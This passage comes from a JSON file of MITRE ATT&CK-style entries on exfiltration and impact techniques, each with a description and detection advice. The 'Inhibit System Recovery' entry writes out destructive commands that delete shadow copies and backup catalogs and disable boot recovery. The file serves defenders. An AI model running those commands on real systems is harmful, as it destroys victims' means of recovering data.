        "description": " \nAdversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as  Exfiltration Over C2 Channel and  Exfiltration Over Alternative Protocol .  ",
        "detection": "\nMonitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.\n\n"
      },
      "T1020.001": {
        "name": "Traffic Duplication",
        "description": " \nAdversaries may leverage traffic mirroring in order to automate data exfiltration over compromised network infrastructure.  Traffic mirroring is a native feature for some network devices and used for network analysis and may be configured to duplicate traffic and forward to one or more destinations for analysis by a network analyzer or other monitoring device.  \n  \n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other network infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through  ROMMONkit or  Patch System Image .  \n \nAdversaries may use traffic duplication in conjunction with  Network Sniffing ,  Input Capture , or  Man-in-the-Middle depending on the goals and objectives of the adversary.  ",
        "detection": "\nMonitor network traffic for uncommon data flows (e.g. unusual network communications, suspicious communications that have never been seen before, communications sending fixed size data packets at regular intervals).  Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1030": {
        "name": "Data Transfer Size Limits",
        "description": " \nAn adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.  \n\n"
      },
      "T1048": {
        "name": "Exfiltration Over Alternative Protocol",
        "description": " \nAdversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n Exfiltration Over Alternative Protocol can be done using various common operating system utilities such as  Net /SMB or FTP.  \n  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.  \n\n"
      },
      "T1048.001": {
        "name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
        "description": " \nAdversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Artifacts and evidence of symmetric key exchange may be recoverable by analyzing network traffic or looking for hard-coded values within malware. If recovered, these keys can be used to decrypt network data from command and control channels. \n\n"
      },
      "T1048.002": {
        "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
        "description": " \nAdversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  \n\n"
      },
      "T1048.003": {
        "name": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "description": " \nAdversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.   \n\n"
      },
      "T1041": {
        "name": "Exfiltration Over C2 Channel",
        "description": " \nAdversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.  \n\n"
      },
      "T1011": {
        "name": "Exfiltration Over Other Network Medium",
        "description": " \nAdversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel. \nAdversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network  ",
        "detection": "\nMonitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.Monitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.\n\n"
      },
      "T1011.001": {
        "name": "Exfiltration Over Bluetooth",
        "description": " \nAdversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an attacker may opt to exfiltrate data using a Bluetooth communication channel. \nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.  ",
        "detection": "\nMonitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.Monitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.\n\n"
      },
      "T1052": {
        "name": "Exfiltration Over Physical Medium",
        "description": " \nAdversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.  ",
        "detection": "\nMonitor file access on removable media. Detect processes that execute when removable media are mounted.\n\n"
      },
      "T1052.001": {
        "name": "Exfiltration over USB",
        "description": " \nAdversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.  ",
        "detection": "\nMonitor file access on removable media. Detect processes that execute when removable media are mounted.\n\n"
      },
      "T1567": {
        "name": "Exfiltration Over Web Service",
        "description": " \nAdversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services. \nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.\n\n"
      },
      "T1567.001": {
        "name": "Exfiltration to Code Repository",
        "description": " \nAdversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection. \nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.\n\n"
      },
      "T1567.002": {
        "name": "Exfiltration to Cloud Storage",
        "description": " \nAdversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet. \nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.\n\n"
      },
      "T1029": {
        "name": "Scheduled Transfer",
        "description": " \nAdversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability. \nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as  Exfiltration Over C2 Channel or  Exfiltration Over Alternative Protocol .  ",
        "detection": "\nMonitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.\n\n"
      },
      "T1537": {
        "name": "Transfer Data to Cloud Account",
        "description": " \nAdversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection. \nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces. \nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.  \n  ",
        "detection": "\nMonitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs. \n\n"
      }
    }
  },
  "TA0040": {
    "name": "Impact",
    "description": "\nThe adversary is trying to manipulate, interrupt, or destroy your systems and data.Impact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.\n",
    "technique": {
      "T1531": {
        "name": "Account Access Removal",
        "description": " \nAdversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. \nAdversaries may also subsequently log off and/or reboot boxes to set malicious changes into place.  \n \n ",
        "detection": "\nUse process monitoring to monitor the execution and command line parameters of binaries involved in deleting accounts or changing passwords, such as use of Net. Windows event logs may also designate activity associated with an adversary's attempt to remove access to an account:Event ID 4723 - An attempt was made to change an account's passwordEvent ID 4724 - An attempt was made to reset an account's passwordEvent ID 4726 - A user account was deletedEvent ID 4740 - A user account was locked outAlerting on Net and these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\n"
      },
      "T1485": {
        "name": "Data Destruction",
        "description": " \nAdversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.  \n \n \n \n \n \nCommon operating system file deletion commands such as  del and  rm often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from  Disk Content Wipe and  Disk Structure Wipe because individual files are destroyed rather than sections of a storage disk or the disk's logical structure. \nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.  \n \nIn some cases politically oriented image files have been used to overwrite data.  \n \n \n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like  Valid Accounts ,  OS Credential Dumping , and  SMB/Windows Admin Shares .  \n \n \n \n \n ",
        "detection": "\nUse process monitoring to monitor the execution and command-line parameters of binaries that could be involved in data destruction activity, such as SDelete. Monitor for the creation of suspicious files as well as high unusual file modification activity. In particular, look for large quantities of file modifications in user directories and under C:\\Windows\\System32\\.\n\n"
      },
      "T1486": {
        "name": "Data Encrypted for Impact",
        "description": " \nAdversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.  \n \n \n \nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.  \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like  Valid Accounts ,  OS Credential Dumping , and  SMB/Windows Admin Shares .  \n \n ",
        "detection": "\nUse process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.In some cases, monitoring for unusual kernel driver installation activity can aid in detection.\n\n"
      },
      "T1565": {
        "name": "Data Manipulation",
        "description": " \nAdversaries may insert, delete, or manipulate data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making. \nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.  ",
        "detection": "\nWhere applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data.\n\n"
      },
      "T1565.001": {
        "name": "Stored Data Manipulation",
        "description": " \nAdversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.  \n \nBy manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.  ",
        "detection": "\nWhere applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values.\n\n"
      },
      "T1565.002": {
        "name": "Transmitted Data Manipulation",
        "description": " \nAdversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.  \n \nBy manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.  ",
        "detection": "\nDetecting the manipulation of data as at passes over a network can be difficult without the appropriate tools. In some cases integrity verification checks, such as file hashing, may be used on critical files as they transit a network. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data. \n\n"
      },
      "T1565.003": {
        "name": "Runtime Data Manipulation",
        "description": " \nAdversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.  \n \nBy manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct  Change Default File Association and  Masquerading to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.  ",
        "detection": "\nInspect important application binary file hashes, locations, and modifications for suspicious/unexpected values.\n\n"
      },
      "T1491": {
        "name": "Defacement",
        "description": " \nAdversaries may modify visual content available internally or externally to an enterprise network. Reasons for  Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of  Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages.  ",
        "detection": "\nMonitor internal and external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.\n\n"
      },
      "T1491.001": {
        "name": "Internal Defacement",
        "description": " \nAn adversary may deface systems internal to an organization in an attempt to intimidate or mislead users. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.  \nDisturbing or offensive images may be used as a part of  Internal Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.  \n ",
        "detection": "\nMonitor internal and websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.\n\n"
      },
      "T1491.002": {
        "name": "External Defacement",
        "description": " \nAn adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.  \n \n \n  External Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as  Drive-by Compromise .  \n ",
        "detection": "\nMonitor external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.\n\n"
      },
      "T1561": {
        "name": "Disk Wipe",
        "description": " \nAdversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted. \nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like  Valid Accounts ,  OS Credential Dumping , and  SMB/Windows Admin Shares .  \n ",
        "detection": "\nLook for attempts to read/write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the \\\\.\\ notation.  Monitor for unusual kernel driver installation activity.\n\n"
      },
      "T1561.001": {
        "name": "Disk Content Wipe",
        "description": " \nAdversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources. \nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.  \n \n \nInstead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.  \nAdversaries have been observed leveraging third-party drivers like  RawDisk to directly access disk content.  \n \nThis behavior is distinct from  Data Destruction because sections of the disk are erased instead of individual files. \nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like  Valid Accounts ,  OS Credential Dumping , and  SMB/Windows Admin Shares .  \n ",
        "detection": "\nLook for attempts to read/write to sensitive locations like the partition boot sector or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the \\\\.\\ notation.  Monitor for unusual kernel driver installation activity.\n\n"
      },
      "T1561.002": {
        "name": "Disk Structure Wipe",
        "description": " \nAdversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.  \n \n \n \n \nThe data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable.  Disk Structure Wipe may be performed in isolation, or along with  Disk Content Wipe if all sectors of a disk are wiped. \nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like  Valid Accounts ,  OS Credential Dumping , and  SMB/Windows Admin Shares .  \n \n \n \n ",
        "detection": "\nLook for attempts to read/write to sensitive locations like the master boot record and the disk partition table. Monitor for direct access read/write attempts using the \\\\.\\ notation.  Monitor for unusual kernel driver installation activity.\n\n"
      },
      "T1499": {
        "name": "Endpoint Denial of Service",
        "description": " \nAdversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes  \nand to support other malicious activities, including distraction  \n, hacktivism, and extortion.  \n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS). \nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets. \nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices. \nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.  \n\nIn cases where traffic manipulation is used, there may be points in the the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.  \n\nFor attacks attempting to saturate the providing network, see  Network Denial of Service .  ",
        "detection": "\nDetection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.  Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.Externally monitor the availability of services that may be targeted by an Endpoint DoS.\n\n"
      },
      "T1499.001": {
        "name": "OS Exhaustion Flood",
        "description": " \nAdversaries may target the operating system (OS) for a DoS attack, since the (OS) is responsible for managing the finite resources on a system. These attacks do not need to exhaust the actual resources on a system since they can simply exhaust the limits that an OS self-imposes to prevent the entire system from being overwhelmed by excessive demands on its capacity. \nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.  \nWith SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.  \n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.  \n ",
        "detection": "\nDetection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.  Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\n"
      },
      "T1499.002": {
        "name": "Service Exhaustion Flood",
        "description": " \nAdversaries may target the different network services provided by systems to conduct a DoS. Adversaries often target DNS and web services, however others have been targeted as well.  \nWeb server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service. \nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.  \n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.  \n ",
        "detection": "\nDetection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.  Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.Externally monitor the availability of services that may be targeted by an Endpoint DoS.\n\n"
      },
      "T1499.003": {
        "name": "Application Exhaustion Flood",
        "description": " \nAdversaries may target resource intensive features of web applications to cause a denial of service (DoS). Specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.  \n ",
        "detection": "\nDetection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.  Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\n\n"
      },
      "T1499.004": {
        "name": "Application or System Exploitation",
        "description": " \nAdversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.  \nSome systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent DoS condition.  ",
        "detection": "\nAttacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack. Externally monitor the availability of services that may be targeted by an Endpoint DoS.\n\n"
      },
      "T1495": {
        "name": "Firmware Corruption",
        "description": " \nAdversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot.  \nFirmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.  ",
        "detection": "\nSystem firmware manipulation may be detected.  Log attempts to read/write to BIOS and compare against known patching behavior.\n\n"
      },
      "T1490": {
        "name": "Inhibit System Recovery",
        "description": " \nAdversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.  \n \nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of  Data Destruction and  Data Encrypted for Impact .  \n \n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:  vssadmin.exe can be used to delete all volume shadow copies on a system -  vssadmin.exe delete shadows /all /quiet  Windows Management Instrumentation can be used to delete volume shadow copies -  wmic shadowcopy delete  wbadmin.exe can be used to delete the Windows Backup Catalog -  wbadmin.exe delete catalog -quiet  bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data -  bcdedit.exe /set {{default}} bootstatuspolicy ignoreallfailures & bcdedit /set {{default}} recoveryenabled no  ",
        "detection": "\nUse process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, and bcdedit. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.Monitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\PreviousVersions\\DisableLocalPage).\n\n"
      },
      "T1498": {
        "name": "Network Denial of Service",
